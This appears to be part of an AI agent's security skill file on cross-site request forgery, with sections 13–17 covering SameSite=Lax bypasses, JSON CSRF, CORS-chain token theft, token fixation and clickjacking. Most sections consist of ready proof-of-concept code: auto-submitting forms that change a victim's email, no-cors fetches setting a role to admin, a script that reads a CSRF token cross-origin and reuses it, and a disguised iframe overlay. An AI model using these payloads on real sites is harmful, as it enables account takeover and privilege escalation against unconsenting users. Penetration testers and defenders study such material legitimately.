# csrf-cross-site-request-forgery — 全文续篇

> 主卡保留前 13 节；本文件从第 14 节起。原文件：`/root/.hermes/skills/security/csrf-cross-site-request-forgery/SKILL.md`

## 13. SAMESITE=LAX ADVANCED BYPASS TECHNIQUES

### 13.1 Top-level navigation via `window.open()` (2-minute window)

Chrome's Lax+POST exception: cookies with `SameSite=Lax` are sent on cross-site POST requests if the cookie was set within the last 2 minutes (exists for OAuth flows).

```javascript
// Attacker page: trigger login to set a fresh cookie, then immediately CSRF
// Step 1: Force victim to visit target (sets fresh session cookie)
window.open('https://target.com/login');
// Step 2: Within 2 minutes, POST to state-changing endpoint
setTimeout(() => {
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = 'https://target.com/account/change-email';
    form.innerHTML = '<input name="email" value="<EMAIL-REDACTED>">';
    document.body.appendChild(form);
    form.submit();
}, 5000);
```

### 13.2 302 redirect chain from attacker site

Lax cookies are sent on top-level GET navigations. A redirect chain converts GET into action:

```text
1. Attacker page → 302 redirect to https://target.com/transfer?to=attacker&amount=1000
2. Browser follows redirect as top-level navigation → Lax cookies sent
3. If target accepts GET for state-changing operations → CSRF succeeds
```

### 13.3 Method override: POST disguised as GET

Many frameworks support method override via `_method` parameter:

```text
GET /account/delete?_method=DELETE&confirm=yes HTTP/1.1
GET /transfer?_method=POST&to=attacker&amount=1000 HTTP/1.1
```

Headers that trigger method override:
```text
X-HTTP-Method-Override: POST
X-Method-Override: DELETE
_method=PUT (Rails, Laravel, Symfony)
```

SameSite=Lax allows the GET → framework processes it as POST/DELETE via override → CSRF on "POST-only" endpoints.

---

## 14. ADVANCED JSON CSRF TECHNIQUES

### 14.1 Flash-based Content-Type manipulation (legacy)

Flash (pre-2021) could send arbitrary `Content-Type` headers cross-origin without preflight:

```actionscript
var req:URLRequest = new URLRequest("https://target.com/api/role");
req.method = "POST";
req.contentType = "application/json";
req.data = '{"role":"admin"}';
navigateToURL(req);
```

Legacy but still relevant for older internal applications.

### 14.2 fetch() no-cors mode limitations and workarounds

`fetch()` in `no-cors` mode can send simple requests but cannot set `Content-Type: application/json` (triggers preflight) or read the response.

Workaround — if the server accepts `text/plain` body and parses it as JSON:

```javascript
fetch('https://target.com/api/role', {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: {'Content-Type': 'text/plain'},
    body: '{"role":"admin"}'
});
```

### 14.3 Encoding JSON as form-urlencoded

Some backends accept both content types:

```html
<form action="https://target.com/api/role" method="POST">
  <input name="role" value="admin">
  <input name="user_id" value="123">
</form>
```

If the server processes `role=admin&user_id=123` the same as `{"role":"admin","user_id":123}` → CSRF via plain HTML form without CORS preflight.

---

## 15. CSRF + CORS MISCONFIGURATION CHAINS

### Reflected Origin + Credentials

```text
1. Target API reflects Origin in Access-Control-Allow-Origin
2. Access-Control-Allow-Credentials: true
3. Attacker page sends credentialed fetch() from https://evil.com
4. Response is readable → CSRF token extracted from response
5. Second request with valid CSRF token → bypass all CSRF defenses
```

```javascript
fetch('https://target.com/api/profile', {credentials: 'include'})
  .then(r => r.json())
  .then(data => {
      fetch('https://target.com/api/change-email', {
          method: 'POST',
          credentials: 'include',
          headers: {
              'Content-Type': 'application/json',
              'X-CSRF-Token': data.csrf_token
          },
          body: JSON.stringify({email: '<EMAIL-REDACTED>'})
      });
  });
```

### Subdomain XSS → CORS → CSRF

If `*.target.com` is in the CORS allowlist and an XSS exists on any subdomain:
1. Exploit XSS on `blog.target.com`
2. From XSS context, fetch API at `api.target.com` (CORS allows subdomain)
3. Read CSRF token from response
4. Submit state-changing request with valid token

---

## 16. CSRF TOKEN FIXATION (PRE-SESSION TOKENS)

If CSRF tokens are issued before authentication and remain valid after login:

```text
1. Attacker visits target.com → receives CSRF token T1
2. Attacker forces victim's browser to use T1:
   a. Cookie tossing from subdomain
   b. CRLF injection to set csrf_cookie
3. Victim logs in — CSRF token unchanged
4. Attacker submits CSRF request with known T1 → succeeds
```

### Test procedure

```text
□ Obtain CSRF token as unauthenticated user
□ Log in — does the CSRF token change?
□ If unchanged → token fixation: pre-auth token works post-auth
□ Use pre-auth token in a CSRF PoC against authenticated endpoint
```

---

## 17. CLICKJACKING AS CSRF BYPASS

When CSRF protections are solid but `X-Frame-Options` / `frame-ancestors` is missing:

### Attack flow

```text
1. Target page is frameable (no X-Frame-Options / CSP frame-ancestors)
2. Attacker creates transparent iframe overlay
3. Victim sees attacker content, clicks land on target's action button in hidden iframe
4. Click originates from same origin (within iframe) — bypasses CSRF tokens
```

### PoC template

```html
<html>
<body>
<div style="position:relative">
  <iframe src="https://target.com/account/settings"
    style="opacity:0.0001; position:absolute; top:0; left:0;
           width:500px; height:500px; z-index:2;">
  </iframe>
  <button style="position:absolute; top:250px; left:200px; z-index:1;
                 padding:20px; font-size:24px;">
    Click to claim prize!
  </button>
</div>
</body>
</html>
```

### Defense check

```text
□ X-Frame-Options: DENY or SAMEORIGIN header present?
□ CSP: frame-ancestors 'self' or frame-ancestors 'none'?
□ If neither → clickjacking possible → CSRF bypass via iframe
```

